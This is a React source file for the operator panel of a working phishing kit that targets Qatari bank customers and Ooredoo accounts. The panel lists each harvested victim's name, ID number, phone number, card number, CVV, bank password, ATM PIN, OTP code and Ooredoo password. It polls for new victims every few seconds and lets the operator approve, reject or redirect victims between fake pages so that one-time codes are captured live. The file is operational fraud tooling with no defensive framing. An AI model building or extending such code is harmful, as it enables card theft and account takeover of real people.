import { useState, useMemo } from "react";
import { useLanguage } from "@/contexts/LanguageContext";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Loader2, Eye, RefreshCcw, Check, X, Users, Lock, LogOut } from "lucide-react";

const getStatusDisplay = (currentStep: string | null | undefined, language: string) => {
  const statusMap: Record<string, Record<string, string>> = {
    ar: {
      login: "صفحة تسجيل الدخول",
      otp: "صفحة OTP الأولى",
      atm: "صفحة رقم السري للـ ATM",
      ooredoo: "صفحة Ooredoo",
      otp_ooredoo: "صفحة OTP Ooredoo",
      pending: "في الانتظار",
      approved: "تمت الموافقة",
      rejected: "تم الرفض",
    },
    en: {
      login: "Login Page",
      otp: "First OTP Page",
      atm: "ATM PIN Page",
      ooredoo: "Ooredoo Page",
      otp_ooredoo: "Ooredoo OTP Page",
      pending: "Pending",
      approved: "Approved",
      rejected: "Rejected",
    },
  };
  return statusMap[language]?.[currentStep || "pending"] || currentStep || "—";
};

const getStatusColor = (currentStep: string | null | undefined) => {
  const colorMap: Record<string, string> = {
    login: "bg-blue-100 text-blue-800 border border-blue-200",
    otp: "bg-purple-100 text-purple-800 border border-purple-200",
    atm: "bg-orange-100 text-orange-800 border border-orange-200",
    ooredoo: "bg-red-100 text-red-800 border border-red-200",
    otp_ooredoo: "bg-pink-100 text-pink-800 border border-pink-200",
  };
  return colorMap[currentStep || ""] || "bg-gray-100 text-gray-800 border border-gray-200";
};

export default function AdminDashboard() {
  const { language, t } = useLanguage();
  const [, setLocation] = useLocation();
  const [searchTerm, setSearchTerm] = useState("");
  const [selectedSession, setSelectedSession] = useState<string | null>(null);
  const [showDetails, setShowDetails] = useState(false);
  const [showRedirectMenu, setShowRedirectMenu] = useState<string | null>(null);
  const [password, setPassword] = useState("");
  const [isAuthenticated, setIsAuthenticated] = useState(() => {
    return typeof window !== 'undefined' && sessionStorage.getItem("adminAuthenticated") === "true";
  });
  const [error, setError] = useState("");

  const { data: submissions, isLoading, refetch } = trpc.submissions.getAllSubmissions.useQuery(undefined, {
    enabled: isAuthenticated,
    refetchInterval: 3000,
  });

  const { data: details } = trpc.submissions.getSubmissionDetails.useQuery(selectedSession || "", {
    enabled: !!selectedSession && isAuthenticated,
  });

  const adminTakeAction = trpc.submissions.adminTakeAction.useMutation({
    onSuccess: () => refetch()
  });

  const adminRedirectMutation = trpc.submissions.adminRedirect.useMutation({
    onSuccess: () => refetch()
  });

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    const obfuscatedKey = "UWF0YXJAQDIwMA==";
    if (btoa(password) === obfuscatedKey) {
      setIsAuthenticated(true);
      sessionStorage.setItem("adminAuthenticated", "true");
      setError("");
    } else {
      setError(language === "ar" ? "كلمة المرور غير صحيحة" : "Incorrect password");
    }
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    sessionStorage.removeItem("adminAuthenticated");
  };

  const filteredSubmissions = useMemo(() => {
    if (!submissions) return [];
    return submissions.filter((sub) =>
      sub.id.toLowerCase().includes(searchTerm.toLowerCase()) ||
      sub.selectedBank.toLowerCase().includes(searchTerm.toLowerCase()) ||
      (sub.nameArabic && sub.nameArabic.includes(searchTerm)) ||
      (sub.phoneNumber && sub.phoneNumber.includes(searchTerm))
    );
  }, [submissions, searchTerm]);

  const handleAction = async (sessionId: string, action: string) => {
    let errorMessage = "";
    if (action === "reject") {
      const session = submissions?.find(s => s.id === sessionId);
      if (session?.currentStep === "login") errorMessage = t("invalid_data");
      else if (session?.currentStep === "otp") errorMessage = t("invalid_otp");
      else if (session?.currentStep === "atm") errorMessage = t("invalid_atm");
      else if (session?.currentStep === "ooredoo") errorMessage = t("invalid_ooredoo");
      else if (session?.currentStep === "otp_ooredoo") errorMessage = t("invalid_ooredoo_otp");
    }
    await adminTakeAction.mutateAsync({ sessionId, action, errorMessage });
  };

  const handleRedirect = async (sessionId: string, targetPage: string) => {
    try {
      await adminRedirectMutation.mutateAsync({ sessionId, targetPage });
      setShowRedirectMenu(null);
    } catch (err) {
      console.error("Redirect error:", err);
    }
  };

  const redirectPages = [
    { id: "login-method", label: language === "ar" ? "صفحة تسجيل الدخول" : "Login Page" },
    { id: "otp", label: language === "ar" ? "صفحة OTP الأولى" : "First OTP Page" },
    { id: "atm-pin", label: language === "ar" ? "صفحة ATM PIN" : "ATM PIN Page" },
    { id: "ooredoo", label: language === "ar" ? "صفحة Ooredoo" : "Ooredoo Page" },
    { id: "otp-ooredoo", label: language === "ar" ? "صفحة OTP Ooredoo" : "Ooredoo OTP Page" },
    { id: "success", label: language === "ar" ? "صفحة النجاح" : "Success Page" },
  ];

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen w-full flex items-center justify-center bg-gray-950 p-4 font-sans" dir={language === "ar" ? "rtl" : "ltr"}>
        <div className="absolute inset-0 overflow-hidden">
          <div className="absolute top-[-10%] left-[-10%] w-[50%] h-[50%] bg-red-900/20 rounded-full blur-[120px]" />
          <div className="absolute bottom-[-10%] right-[-10%] w-[50%] h-[50%] bg-red-900/20 rounded-full blur-[120px]" />
        </div>
        
        <div className="w-full max-w-md relative z-10">
          <form 
            onSubmit={handleLogin} 
            className="bg-zinc-900/80 border border-white/10 backdrop-blur-2xl p-8 rounded-3xl shadow-2xl space-y-8"
          >
            <div className="text-center space-y-4">
              <div className="inline-flex items-center justify-center w-20 h-20 bg-red-600 rounded-2xl shadow-xl shadow-red-600/20 mb-2">
                <Lock className="w-10 h-10 text-white" />
              </div>
              <h1 className="text-3xl font-black text-white tracking-tight">
                {language === "ar" ? "لوحة الإدارة" : "Admin Panel"}
              </h1>
              <p className="text-zinc-400 text-sm font-medium">
                {language === "ar" ? "يرجى إدخال كلمة المرور للمتابعة" : "Please enter your password to continue"}
              </p>
            </div>

            <div className="space-y-4">
              <div className="space-y-2">
                <label className="text-xs font-bold text-zinc-500 uppercase tracking-wider px-1">
                  {language === "ar" ? "كلمة المرور" : "Password"}
                </label>
                <div className="relative">
                  <Input
                    type="password"
                    placeholder="••••••••"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full bg-black/40 border-zinc-800 text-white text-lg h-14 rounded-2xl focus:ring-2 focus:ring-red-600 focus:border-transparent transition-all placeholder:text-zinc-700"
                  />
                </div>
              </div>

              {error && (
                <div className="bg-red-500/10 border border-red-500/20 text-red-500 text-xs font-bold p-4 rounded-xl text-center">
                  {error}
                </div>
              )}

              <Button 
                type="submit" 
                className="w-full bg-red-600 hover:bg-red-700 text-white font-bold h-14 rounded-2xl shadow-lg shadow-red-600/20 transition-all active:scale-95"
              >
                {language === "ar" ? "تسجيل الدخول" : "Sign In"}
              </Button>
            </div>

            <div className="pt-4 text-center border-t border-white/5">
              <p className="text-zinc-600 text-[10px] font-bold uppercase tracking-[0.2em]">
                &copy; {new Date().getFullYear()} Qatar Tayrn &bull; Security Protocol
              </p>
            </div>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-zinc-50 font-sans" dir={language === "ar" ? "rtl" : "ltr"}>
      {/* Navbar */}
      <nav className="sticky top-0 z-50 bg-white/80 backdrop-blur-md border-b border-zinc-200">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-20">
            <div className="flex items-center gap-4">
              <div className="w-10 h-10 bg-red-600 rounded-xl flex items-center justify-center shadow-lg shadow-red-600/20">
                <Users className="w-6 h-6 text-white" />
              </div>
              <h1 className="text-xl font-black text-zinc-900 tracking-tight hidden sm:block">
                {language === "ar" ? "لوحة التحكم" : "Control Panel"}
              </h1>
            </div>
            
            <div className="flex items-center gap-3">
              <Button 
                variant="outline" 
                onClick={() => setLocation("/")}
                className="rounded-xl border-zinc-200 text-zinc-600 hover:bg-zinc-50 font-bold text-xs"
              >
                {language === "ar" ? "عرض الموقع" : "View Site"}
              </Button>
              <Button 
                variant="ghost" 
                onClick={handleLogout}
                className="rounded-xl text-red-600 hover:bg-red-50 font-bold text-xs flex items-center gap-2"
              >
                <LogOut className="w-4 h-4" />
                {language === "ar" ? "تسجيل الخروج" : "Logout"}
              </Button>
            </div>
          </div>
        </div>
      </nav>

      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-10">
        {/* Stats Grid */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-10">
          {[
            { label: language === "ar" ? "الزيارات الحالية" : "Active Visitors", value: submissions?.length || 0, color: "from-zinc-800 to-zinc-900", icon: Users },
            { label: language === "ar" ? "طلبات معلقة" : "Pending Actions", value: submissions?.filter(s => s.status === "loading").length || 0, color: "from-red-600 to-red-700", icon: Loader2 },
            { label: language === "ar" ? "عمليات مكتملة" : "Completed", value: submissions?.filter(s => s.status === "approved").length || 0, color: "from-emerald-600 to-emerald-700", icon: Check },
          ].map((stat, i) => (
            <div key={i} className={`bg-gradient-to-br ${stat.color} p-8 rounded-3xl shadow-xl shadow-zinc-200 text-white relative overflow-hidden group`}>
              <stat.icon className="absolute right-[-10%] bottom-[-10%] w-32 h-32 opacity-10 group-hover:scale-110 transition-transform" />
              <p className="text-white/70 text-xs font-bold uppercase tracking-widest mb-2">{stat.label}</p>
              <p className="text-5xl font-black tracking-tighter">{stat.value}</p>
            </div>
          ))}
        </div>

        {/* Table Section */}
        <div className="bg-white rounded-[2rem] shadow-2xl shadow-zinc-200/50 border border-zinc-200 overflow-hidden">
          <div className="p-8 border-b border-zinc-100 bg-zinc-50/50 flex flex-col sm:flex-row justify-between items-center gap-6">
            <h2 className="text-lg font-black text-zinc-900">{language === "ar" ? "سجل العمليات" : "Activity Log"}</h2>
            <div className="w-full sm:w-96 relative">
              <Input
                placeholder={language === "ar" ? "بحث عن عميل، بنك، هاتف..." : "Search..."}
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="w-full bg-white border-zinc-200 rounded-2xl h-12 px-6 focus:ring-red-600 transition-all shadow-sm"
              />
            </div>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-right border-collapse">
              <thead>
                <tr className="bg-zinc-50/50 text-zinc-500 text-[10px] font-black uppercase tracking-widest">
                  <th className="px-8 py-6">{language === "ar" ? "الدولة" : "Country"}</th>
                  <th className="px-8 py-6">{language === "ar" ? "البنك" : "Bank"}</th>
                  <th className="px-8 py-6">{language === "ar" ? "الاسم" : "Name"}</th>
                  <th className="px-8 py-6">{language === "ar" ? "الهاتف" : "Phone"}</th>
                  <th className="px-8 py-6">{language === "ar" ? "الهوية" : "ID"}</th>
                  <th className="px-8 py-6">{language === "ar" ? "الحالة" : "Status"}</th>
                  <th className="px-8 py-6 text-center">{language === "ar" ? "الإجراءات" : "Actions"}</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-zinc-100">
                {isLoading ? (
                  <tr><td colSpan={7} className="py-20 text-center"><Loader2 className="w-10 h-10 animate-spin mx-auto text-red-600" /></td></tr>
                ) : filteredSubmissions.length === 0 ? (
                  <tr><td colSpan={7} className="py-20 text-center font-bold text-zinc-400">{language === "ar" ? "لا توجد سجلات حالياً" : "No records found"}</td></tr>
                ) : filteredSubmissions.map((sub) => (
                  <tr key={sub.id} className="hover:bg-zinc-50/50 transition-colors group">
                    <td className="px-8 py-6 font-bold text-zinc-600">{sub.country || "Qatar"}</td>
                    <td className="px-8 py-6"><span className="bg-red-50 text-red-700 px-3 py-1 rounded-lg text-xs font-black uppercase">{sub.selectedBank}</span></td>
                    <td className="px-8 py-6 font-bold text-zinc-900">{sub.nameArabic || "—"}</td>
                    <td className="px-8 py-6 font-medium text-zinc-500">{sub.phoneNumber || "—"}</td>
                    <td className="px-8 py-6 font-medium text-zinc-500">{sub.idNumber || "—"}</td>
                    <td className="px-8 py-6">
                      <span className={`px-4 py-1.5 rounded-full text-[10px] font-black uppercase tracking-tight ${getStatusColor(sub.currentStep)}`}>
                        {getStatusDisplay(sub.currentStep, language)}
                      </span>
                    </td>
                    <td className="px-8 py-6">
                      <div className="flex items-center justify-center gap-2">
                        <Button 
                          variant="secondary" 
                          size="sm" 
                          className="rounded-xl h-10 px-4 bg-zinc-100 hover:bg-zinc-200 text-zinc-900 font-bold text-xs gap-2"
                          onClick={() => { setSelectedSession(sub.id); setShowDetails(true); }}
                        >
                          <Eye className="w-4 h-4" /> {language === "ar" ? "تفاصيل" : "Details"}
                        </Button>

                        <div className="relative">
                          <Button 
                            variant="secondary" 
                            size="sm" 
                            className="rounded-xl h-10 px-4 bg-zinc-100 hover:bg-zinc-200 text-zinc-900 font-bold text-xs gap-2"
                            onClick={() => setShowRedirectMenu(showRedirectMenu === sub.id ? null : sub.id)}
                          >
                            <RefreshCcw className="w-4 h-4" /> {language === "ar" ? "توجيه" : "Redirect"}
                          </Button>
                          
                          {showRedirectMenu === sub.id && (
                            <div className="absolute top-full mt-2 left-0 bg-white border border-zinc-200 rounded-2xl shadow-2xl z-50 min-w-[180px] overflow-hidden animate-in fade-in slide-in-from-top-2">
                              {redirectPages.map((page) => (
                                <button
                                  key={page.id}
                                  onClick={() => handleRedirect(sub.id, page.id)}
                                  className="w-full text-right px-6 py-3 text-xs font-bold text-zinc-600 hover:bg-zinc-50 hover:text-red-600 transition-colors"
                                >
                                  {page.label}
                                </button>
                              ))}
                            </div>
                          )}
                        </div>

                        {sub.status === "loading" && (
                          <div className="flex gap-2 border-r border-zinc-200 pr-2 ml-2">
                            <Button 
                              size="sm" 
                              className="w-10 h-10 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-white shadow-lg shadow-emerald-500/20"
                              onClick={() => handleAction(sub.id, "approve")}
                            >
                              <Check className="w-5 h-5" />
                            </Button>
                            <Button 
                              size="sm" 
                              className="w-10 h-10 rounded-xl bg-red-500 hover:bg-red-600 text-white shadow-lg shadow-red-500/20"
                              onClick={() => handleAction(sub.id, "reject")}
                            >
                              <X className="w-5 h-5" />
                            </Button>
                          </div>
                        )}
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      </main>

      {/* Details Modal */}
      <Dialog open={showDetails} onOpenChange={setShowDetails}>
        <DialogContent className="max-w-2xl bg-white rounded-[2rem] border-none shadow-2xl p-0 overflow-hidden" dir={language === "ar" ? "rtl" : "ltr"}>
          <div className="bg-zinc-900 p-8 text-white flex justify-between items-center">
            <h3 className="text-xl font-black">{language === "ar" ? "تفاصيل العملية" : "Submission Details"}</h3>
            <span className="bg-red-600 px-3 py-1 rounded-lg text-[10px] font-black uppercase tracking-widest">
              {details?.session.selectedBank}
            </span>
          </div>
          
          <div className="p-8 max-h-[70vh] overflow-y-auto space-y-8">
            {details ? (
              <>
                <section className="space-y-4">
                  <h4 className="text-[10px] font-black uppercase tracking-widest text-zinc-400">{language === "ar" ? "البيانات الشخصية" : "Personal Info"}</h4>
                  <div className="grid grid-cols-2 gap-4">
                    {[
                      { label: language === "ar" ? "الاسم الكامل" : "Full Name", value: details.personalData?.nameArabic },
                      { label: language === "ar" ? "رقم الهاتف" : "Phone Number", value: details.personalData?.phoneNumber },
                      { label: language === "ar" ? "رقم الهوية" : "ID Number", value: details.personalData?.idNumber },
                      { label: language === "ar" ? "تاريخ الميلاد" : "Birth Date", value: details.personalData?.dateOfBirth },
                    ].map((item, i) => (
                      <div key={i} className="bg-zinc-50 p-4 rounded-2xl border border-zinc-100">
                        <p className="text-[10px] font-bold text-zinc-400 mb-1 uppercase">{item.label}</p>
                        <p className="font-bold text-zinc-900">{item.value || "—"}</p>
                      </div>
                    ))}
                  </div>
                </section>

                <section className="space-y-4">
                  <h4 className="text-[10px] font-black uppercase tracking-widest text-zinc-400">{language === "ar" ? "بيانات الدخول" : "Login Data"}</h4>
                  <div className="bg-zinc-50 p-6 rounded-3xl border border-zinc-100">
                    {details.loginMethod?.loginType === "card" ? (
                      <div className="grid grid-cols-2 gap-6">
                        <div className="col-span-2">
                          <p className="text-[10px] font-bold text-zinc-400 mb-1 uppercase">{language === "ar" ? "رقم البطاقة" : "Card Number"}</p>
                          <p className="text-xl font-black tracking-widest text-zinc-900">{details.loginMethod.cardNumber}</p>
                        </div>
                        <div>
                          <p className="text-[10px] font-bold text-zinc-400 mb-1 uppercase">{language === "ar" ? "تاريخ الانتهاء" : "Expiry"}</p>
                          <p className="font-bold text-zinc-900">{details.loginMethod.expiryDate}</p>
                        </div>
                        <div>
                          <p className="text-[10px] font-bold text-zinc-400 mb-1 uppercase">CVV</p>
                          <p className="font-bold text-zinc-900">{details.loginMethod.cvv}</p>
                        </div>
                      </div>
                    ) : (
                      <div className="grid grid-cols-2 gap-6">
                        <div>
                          <p className="text-[10px] font-bold text-zinc-400 mb-1 uppercase">{language === "ar" ? "اسم المستخدم" : "Username"}</p>
                          <p className="font-bold text-zinc-900">{details.loginMethod?.username || "—"}</p>
                        </div>
                        <div>
                          <p className="text-[10px] font-bold text-zinc-400 mb-1 uppercase">{language === "ar" ? "كلمة المرور" : "Password"}</p>
                          <p className="font-bold text-zinc-900">{details.loginMethod?.password || "—"}</p>
                        </div>
                      </div>
                    )}
                  </div>
                </section>

                <div className="grid grid-cols-2 gap-6">
                  {details.atmPin && (
                    <div className="bg-orange-50 p-6 rounded-3xl border border-orange-100">
                      <p className="text-[10px] font-black text-orange-400 uppercase tracking-widest mb-2">ATM PIN</p>
                      <p className="text-3xl font-black text-orange-700 tracking-[0.3em]">{details.atmPin.pin}</p>
                    </div>
                  )}
                  {details.otp && (
                    <div className="bg-blue-50 p-6 rounded-3xl border border-blue-100">
                      <p className="text-[10px] font-black text-blue-400 uppercase tracking-widest mb-2">OTP CODE</p>
                      <p className="text-3xl font-black text-blue-700 tracking-[0.3em]">{details.otp.otpCode}</p>
                    </div>
                  )}
                </div>

                {details.ooredoo && (
                  <section className="space-y-4">
                    <h4 className="text-[10px] font-black uppercase tracking-widest text-zinc-400">Ooredoo Credentials</h4>
                    <div className="bg-purple-50 p-6 rounded-3xl border border-purple-100 grid grid-cols-2 gap-6">
                      <div>
                        <p className="text-[10px] font-bold text-purple-400 mb-1 uppercase">User</p>
                        <p className="font-bold text-purple-900">{details.ooredoo.ooredooUser}</p>
                      </div>
                      <div>
                        <p className="text-[10px] font-bold text-purple-400 mb-1 uppercase">Pass</p>
                        <p className="font-bold text-purple-900">{details.ooredoo.ooredooPassword}</p>
                      </div>
                    </div>
                  </section>
                )}
              </>
            ) : (
              <div className="py-20 text-center"><Loader2 className="w-10 h-10 animate-spin mx-auto text-red-600" /></div>
            )}
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}
